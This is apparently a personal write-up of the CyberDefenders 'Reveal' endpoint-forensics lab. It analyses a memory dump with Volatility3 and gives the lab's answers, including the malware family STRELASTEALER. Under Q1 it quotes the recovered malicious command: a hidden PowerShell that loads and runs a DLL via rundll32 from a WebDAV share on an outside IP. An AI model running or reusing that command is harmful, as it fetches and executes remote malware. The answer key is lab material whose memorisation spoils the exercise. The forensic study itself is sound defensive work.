https://cyberdefenders.org/blueteam-ctf-challenges/revil/

This is a brief description of my work on the CyberDefenders "Reveal" lab (category: Endpoint Forensics). It has a difficulty of Easy.


Here is the scenario:


*As a cybersecurity analyst for a leading financial institution, an alert from your SIEM solution has flagged unusual activity on an internal workstation. Given the sensitive financial data at risk, immediate action is required to prevent potential breaches.*


*Your task is to delve into the provided memory dump from the compromised system. You need to identify basic Indicators of Compromise (IOCs) and determine the extent of the intrusion. Investigate the malicious commands or files executed in the environment, and report your findings in detail to aid in remediation and enhance future defenses.*

To get started, I ran a few Volatility3 plugins with the output directed into their own file: psxview, pstree, cmdline, netscan, malfind. See the files in this folder for the output.
Then I imported the output into a spreadsheet application for easier review: the tab-delimited output doesn't render correctly in Notepad or Notepad++, and its easier to sort the data this way.

I made some initial observations and bolded these rows for follow up later: 

- powershell.exe and msiexec.exe in the "psxview" output, and

- WMiPrvSE.exe, Calculator.exe (this is a child process of svchost.exe, which is suspicious), and the orphaned processes MicrosoftEdgeUpdater.exe, wordpad.exe, powershell.exe, and net.exe.

Looking at the "pstree" output, the command line associated with powershell.exe was the apparent malicious process: use of rundll32 to load a DLL over a network share is a popular method to load and execute code directly in memory, without leaving any disk artifacts behind.

Now for the questions!

Q1 Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process? **powershell.exe**
- I ran the "pstree" plugin, identified a suspicious process and confirmed after a review of the command line used to execute it: 
`powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`

Q2 Knowing the parent process ID (PID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process? **4120**
- I learned this from reviewing the "pstree" output.

Q3 Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload? **3435.dll**
- I learned this from reviewing the command described in the answer for Q1.

Q4 Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server? davwwwroot
- I learned this from reviewing the command described in the answer for Q1.

Q5 What is the MITRE sub-technique ID used by the malware to execute the second-stage payload? T1218.011 (System Binary Proxy Execution: Rundll32)
- I searched the MITRE ATT&CK website to find the sub-technique ID associated with rundll32.

Q6 Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under? Elon
- I ran the "getsids" plugin against the malicious process ID.

Q7 Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family? STRELASTEALER
- I looked up the IP address from the command described in the answer for Q1 in VirusTotal.
